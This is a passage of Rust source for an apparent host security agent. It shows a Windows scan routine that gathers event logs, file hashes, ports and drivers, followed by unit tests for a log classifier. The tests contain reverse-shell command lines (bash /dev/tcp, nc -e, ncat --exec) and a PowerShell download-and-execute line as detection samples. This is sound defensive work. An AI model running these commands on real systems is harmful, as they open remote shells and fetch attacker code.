                && let Ok(port) = port_str.trim().parse::<u16>()
                && !is_private_or_loopback(&ip)
            {
                lines_with_source.push((
                    "network-outbound",
                    format!("remote_port={port}\tremote_addr={ip}\tproto=tcp"),
                ));
            }
        }
    }

    let scanned = lines_with_source.len();
    let mut stdout = String::new();
    let mut matched_count = 0usize;
    for (source, line) in &lines_with_source {
        if let Some((severity, label)) = classify(line) {
            matched_count += 1;
            stdout.push_str(&format!("{severity}\t{label}\t{source}\t{line}\n"));
        }
    }

    // File-integrity watch-list -- see `WINDOWS_FIM_WATCHLIST`'s doc
    // comment for what each item captures and why it's hashed uniformly.
    for item in WINDOWS_FIM_WATCHLIST {
        let hash_script = windows_fim_hash_script(item.capture_expr);
        if let Ok(output) = crate::process::run_command(
            "powershell.exe",
            &["-NoProfile", "-NonInteractive", "-Command", &hash_script],
        )
        .await
        {
            let hash = output.stdout.trim();
            if !hash.is_empty() {
                stdout.push_str(&format!("fim\t{}\t{hash}\n", item.identifier));
            }
        }
    }

    // Admin-configured extra paths (Phase 7b) -- additive to the fixed
    // watch-list above, re-validated here even though the control plane
    // already checked them (see `AgentOperation::ScanSecurityEvents`'s
    // own doc comment).
    for path in &extra_fim_paths {
        if !abyssal_agent_protocol::is_valid_windows_absolute_path(path) {
            continue;
        }
        let capture_expr = format!(
            "(Get-Content -Raw -Path {} -ErrorAction SilentlyContinue)",
            crate::process::ps_quote(path)
        );
        let hash_script = windows_fim_hash_script(&capture_expr);
        if let Ok(output) = crate::process::run_command(
            "powershell.exe",
            &["-NoProfile", "-NonInteractive", "-Command", &hash_script],
        )
        .await
        {
            let hash = output.stdout.trim();
            if !hash.is_empty() {
                stdout.push_str(&format!("fim\t{path}\t{hash}\n"));
            }
        }
    }

    // Listening ports -- reported fresh every scan, normalized to the
    // same `"tcp:<port>"`/`"udp:<port>"` shape `linux_listening_ports`
    // produces (see that function's doc comment for why the control
    // plane does the diffing, not the agent).
    let port_script = "$tcp = Get-NetTCPConnection -State Listen -ErrorAction SilentlyContinue | \
         ForEach-Object { \"tcp:$($_.LocalPort)\" }; \
         $udp = Get-NetUDPEndpoint -ErrorAction SilentlyContinue | \
         ForEach-Object { \"udp:$($_.LocalPort)\" }; \
         ($tcp + $udp) | Sort-Object -Unique";
    if let Ok(output) = crate::process::run_command(
        "powershell.exe",
        &["-NoProfile", "-NonInteractive", "-Command", port_script],
    )
    .await
    {
        for line in output.stdout.lines() {
            let port_key = line.trim();
            if !port_key.is_empty() {
                stdout.push_str(&format!("port\t{port_key}\n"));
            }
        }
    }

    // Currently running drivers (Phase 9) -- the Windows analog of
    // `linux_kernel_modules`: a malicious driver is exactly as real a
    // rootkit vector on Windows as a malicious kernel module is on
    // Linux, and a healthy host's set is naturally just as stable.
    let driver_script = "Get-CimInstance Win32_SystemDriver -Filter \"State='Running'\" \
         -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Name";
    if let Ok(output) = crate::process::run_command(
        "powershell.exe",
        &["-NoProfile", "-NonInteractive", "-Command", driver_script],
    )
    .await
    {
        for line in output.stdout.lines() {
            let module_key = line.trim();
            if !module_key.is_empty() {
                stdout.push_str(&format!("module\t{module_key}\n"));
            }
        }
    }

    if matched_count == 0 {
        let note = if scanned == 0 {
            "No event log entries were readable for the watched event IDs (Security, System, \
             and -- if enabled on this host -- PowerShell script block logging and Windows \
             Defender's operational log)."
                .to_string()
        } else {
            format!("Scanned {scanned} event(s); nothing matched the current detection rules.")
        };
        stdout.push_str(&format!("info\t{note}\n"));
    }

    CommandOutcome::Ok(OperationOutput {
        stdout,
        stderr: String::new(),
        exit_code: Some(0),
    })
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn classifies_oom_killer_invocations_as_high() {
        assert_eq!(
            classify("kernel: [12345.678] myproc invoked oom-killer: gfp_mask=0x..."),
            Some(("high", "OOM killer invoked"))
        );
        assert_eq!(
            classify("Out of memory: Killed process 1234 (myproc) total-vm:..."),
            Some(("high", "OOM killer invoked"))
        );
    }

    #[test]
    fn classifies_hardware_and_io_errors() {
        assert_eq!(
            classify("mce: [Hardware Error]: Machine Check Event"),
            Some(("high", "Hardware machine-check event"))
        );
        assert_eq!(
            classify("Buffer I/O error on device sda1, logical block 12345"),
            Some(("medium", "Disk I/O error"))
        );
    }

    #[test]
    fn classifies_failed_systemd_units() {
        assert_eq!(
            classify("myapp.service loaded failed failed My App"),
            Some(("medium", "systemd unit failed"))
        );
    }

    #[test]
    fn segfault_still_classifies_after_the_new_rules_were_added() {
        // Regression check: the new kernel/systemd rules were appended
        // after the existing ones, not inserted in the middle -- make
        // sure that didn't silently reorder anything load-bearing.
        assert_eq!(
            classify("kernel: myproc[1234]: segfault at 0 ip 0000 sp 0000 error 4"),
            Some(("medium", "Process segfault"))
        );
    }

    #[test]
    fn unrelated_lines_do_not_classify() {
        assert_eq!(classify("systemd[1]: Started My App."), None);
        assert_eq!(classify("kernel: [1.0] Linux version 6.1.0"), None);
    }

    #[test]
    fn classifies_windows_event_log_signals_by_stable_event_id_marker() {
        assert_eq!(
            classify("EventID=4625\tTime=2026-01-01T00:00:00.000Z\tAn account failed to log on."),
            Some(("high", "Windows failed logon"))
        );
        assert_eq!(
            classify(
                "EventID=4624\tTime=2026-01-01T00:00:00.000Z\tAn account was successfully logged on."
            ),
            Some(("low", "Windows successful logon"))
        );
        assert_eq!(
            classify("EventID=4720\tTime=2026-01-01T00:00:00.000Z\tA user account was created."),
            Some(("medium", "Windows user account created"))
        );
        assert_eq!(
            classify(
                "EventID=4732\tTime=2026-01-01T00:00:00.000Z\tA member was added to a security-enabled local group."
            ),
            Some(("high", "Windows account added to a security group"))
        );
    }

    #[test]
    fn classifies_windows_system_log_signals() {
        assert_eq!(
            classify(
                "EventID=6008\tTime=2026-01-01T00:00:00.000Z\tThe previous system shutdown was unexpected."
            ),
            Some(("high", "Unexpected system shutdown"))
        );
        assert_eq!(
            classify(
                "EventID=7000\tTime=2026-01-01T00:00:00.000Z\tThe Foo service failed to start."
            ),
            Some(("medium", "Windows service failed to start"))
        );
    }

    #[test]
    fn classifies_suspicious_process_creation_command_lines_regardless_of_event_id() {
        // 4688 (process creation) is deliberately not matched by EventID
        // alone -- see the RULES doc comment. Only a command line
        // containing a known obfuscation/LOLBin pattern should classify.
        assert_eq!(
            classify(
                "EventID=4688\tTime=2026-01-01T00:00:00.000Z\tpowershell.exe -EncodedCommand SQBFAFgA"
            ),
            Some(("high", "Suspicious encoded PowerShell command"))
        );
        assert_eq!(
            classify("EventID=4688\tTime=2026-01-01T00:00:00.000Z\tcmd.exe /c whoami /priv"),
            None
        );
    }

    #[test]
    fn classifies_broader_windows_security_log_signals() {
        assert_eq!(
            classify(
                "EventID=4648\tTime=2026-01-01T00:00:00.000Z\tA logon was attempted using explicit credentials."
            ),
            Some((
                "high",
                "Explicit-credential logon (possible lateral movement)"
            ))
        );
        assert_eq!(
            classify(
                "EventID=4672\tTime=2026-01-01T00:00:00.000Z\tSpecial privileges assigned to new logon."
            ),
            Some(("medium", "Privileged logon (admin/SYSTEM-level)"))
        );
        assert_eq!(
            classify(
                "EventID=4697\tTime=2026-01-01T00:00:00.000Z\tA service was installed in the system."
            ),
            Some(("high", "Windows service installed"))
        );
        assert_eq!(
            classify(
                "EventID=4719\tTime=2026-01-01T00:00:00.000Z\tSystem audit policy was changed."
            ),
            Some((
                "high",
                "System audit policy changed (possible log tampering)"
            ))
        );
        assert_eq!(
            classify("EventID=1102\tTime=2026-01-01T00:00:00.000Z\tThe audit log was cleared."),
            Some(("high", "Windows audit log was cleared (anti-forensics)"))
        );
        assert_eq!(
            classify("EventID=4740\tTime=2026-01-01T00:00:00.000Z\tA user account was locked out."),
            Some(("low", "Windows account locked out"))
        );
    }

    #[test]
    fn classifies_scheduled_task_lifecycle_events_distinctly() {
        assert_eq!(
            classify("EventID=4698\tTime=2026-01-01T00:00:00.000Z\tA scheduled task was created."),
            Some(("medium", "Scheduled task created"))
        );
        assert_eq!(
            classify("EventID=4699\tTime=2026-01-01T00:00:00.000Z\tA scheduled task was deleted."),
            Some(("medium", "Scheduled task deleted"))
        );
        assert_eq!(
            classify("EventID=4700\tTime=2026-01-01T00:00:00.000Z\tA scheduled task was enabled."),
            Some(("medium", "Scheduled task enabled"))
        );
        assert_eq!(
            classify("EventID=4701\tTime=2026-01-01T00:00:00.000Z\tA scheduled task was disabled."),
            Some(("medium", "Scheduled task disabled"))
        );
        assert_eq!(
            classify("EventID=4702\tTime=2026-01-01T00:00:00.000Z\tA scheduled task was updated."),
            Some(("medium", "Scheduled task updated"))
        );
    }

    #[test]
    fn classifies_windows_defender_signals() {
        assert_eq!(
            classify(
                "EventID=1116\tTime=2026-01-01T00:00:00.000Z\tWindows Defender has detected malware."
            ),
            Some(("high", "Windows Defender detected malware"))
        );
        assert_eq!(
            classify(
                "EventID=5001\tTime=2026-01-01T00:00:00.000Z\tReal-time protection was disabled."
            ),
            Some(("high", "Windows Defender real-time protection disabled"))
        );
    }

    #[test]
    fn powershell_script_block_logging_reuses_existing_lolbin_rules() {
        // Event 4104 lines carry no dedicated RULES entry of their own --
        // they reuse whichever LOLBin/obfuscation pattern already exists
        // for 4688, since the underlying signal (a suspicious command/
        // script) is the same regardless of which log emitted it.
        assert_eq!(
            classify(
                "EventID=4104\tTime=2026-01-01T00:00:00.000Z\tCreating Scriptblock text (1 of 1): IEX (New-Object Net.WebClient).DownloadString('http://evil') -EncodedCommand"
            ),
            Some(("high", "Suspicious encoded PowerShell command"))
        );
    }

    #[test]
    fn classifies_reverse_shell_process_command_lines() {
        assert_eq!(
            classify("bash -c bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"),
            Some(("high", "Possible reverse shell (bash /dev/tcp construct)"))
        );
        assert_eq!(
            classify("nc -e /bin/sh 10.0.0.1 4444"),
            Some(("high", "Possible reverse shell (netcat -e)"))
        );
        assert_eq!(
            classify("ncat --exec /bin/sh 10.0.0.1 4444"),
            Some(("high", "Possible reverse shell (ncat --exec)"))
        );
    }

    #[test]
    fn ordinary_process_command_lines_do_not_classify() {
        assert_eq!(classify("/usr/sbin/sshd -D"), None);
        assert_eq!(classify("nginx: worker process"), None);
        assert_eq!(classify("/usr/bin/python3 /opt/app/server.py"), None);
    }

    #[cfg(unix)]
    #[test]
    fn parses_listening_port_from_ss_style_line() {
        assert_eq!(
            parse_listening_port("LISTEN 0      128        0.0.0.0:22           0.0.0.0:*", 3),
            Some("22")
        );
        assert_eq!(
            parse_listening_port(
                "LISTEN 0      4096          [::]:443              [::]:*",
                3
            ),
            Some("443")
        );
    }

    #[cfg(unix)]
    #[test]
    fn parses_listening_port_from_netstat_style_line() {
        assert_eq!(
            parse_listening_port(
                "tcp        0      0 0.0.0.0:8080            0.0.0.0:*               LISTEN",
                3
            ),
            Some("8080")
        );
    }

    #[test]
    fn classifies_known_reverse_shell_ports() {
        for port in ["4444", "1337", "31337", "6666", "6667"] {
            assert_eq!(
                classify(&format!(
                    "remote_port={port}\tremote_addr=203.0.113.9\tproto=tcp"
                )),
                Some((
                    "high",
                    "Outbound connection to a well-known reverse-shell port"
                )),
                "port {port} should classify"
            );
        }
    }

    #[test]
    fn does_not_classify_a_similar_but_different_port() {
        // Regression check: "remote_port=16667" must not match the
        // "remote_port=6667" needle just because it contains "6667" as a
        // substring -- the `remote_port=` prefix has to line up exactly.
        assert_eq!(
            classify("remote_port=16667\tremote_addr=203.0.113.9\tproto=tcp"),
            None
        );
        assert_eq!(
            classify("remote_port=443\tremote_addr=203.0.113.9\tproto=tcp"),
            None
        );
    }

    #[test]
    fn is_private_or_loopback_recognizes_common_internal_ranges() {
        for ip in [
            "10.0.0.5",
            "172.16.0.5",
            "192.168.1.5",
            "127.0.0.1",
            "169.254.1.1",
            "::1",
            "fc00::1",
            "fe80::1",
        ] {
            assert!(
                is_private_or_loopback(&ip.parse().unwrap()),
                "{ip} should be treated as private/loopback"
            );
        }
    }

    #[test]
    fn is_private_or_loopback_does_not_flag_public_addresses() {
        for ip in ["203.0.113.9", "8.8.8.8", "2001:db8::1"] {
            assert!(
                !is_private_or_loopback(&ip.parse().unwrap()),
                "{ip} should be treated as public"
            );
        }
    }

    #[cfg(unix)]
    #[test]
    fn parses_remote_addr_port_from_ss_established_line() {
        assert_eq!(
            parse_remote_addr_port("ESTAB 0 0 192.168.1.5:52341 203.0.113.9:4444", 4),
            Some(("203.0.113.9".parse().unwrap(), 4444))
        );
    }

    #[cfg(unix)]
    #[test]
    fn parses_remote_addr_port_handles_bracketed_ipv6() {
        assert_eq!(
            parse_remote_addr_port("ESTAB 0 0 [::1]:52341 [2001:db8::1]:4444", 4),
            Some(("2001:db8::1".parse().unwrap(), 4444))
        );
    }
}
